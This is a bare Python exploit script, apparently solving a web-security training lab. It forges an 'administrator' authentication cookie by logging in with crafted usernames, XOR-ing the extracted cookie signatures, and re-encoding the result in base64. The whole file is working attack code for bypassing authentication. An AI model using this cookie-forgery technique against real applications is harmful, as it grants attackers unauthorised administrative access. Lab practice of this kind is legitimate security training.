import base64
import requests

def xor(s1,s2):    
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

r1 = requests.Session()
url = "http://ptl-ea68aec5-8c519d75.libcurl.so/"
response = r1.post(url+"login.php",data={"username":"administ","password":"Password1"})
cookie1 = r1.cookies.get_dict()['auth']
signature1 = ((str(base64.b64decode(cookie1))).split('--')[1]).rstrip('\'')
print(signature1)
maluser = xor("rator\x00\x00\x00",signature1)
r2 = requests.Session()
response = r2.post(url+"login.php",data={"username":maluser,"password":"Password1"})
cookie2 = r2.cookies.get_dict()['auth']
signature2 = ((str(base64.b64decode(cookie2))).split('--')[1]).rstrip('\'')
print(signature2)
print(type(bytes(signature2,encoding='utf8')))
final_cookie = bytes("administrator--{}".format(signature2),encoding='utf8')
final = base64.b64encode(final_cookie)
print(final)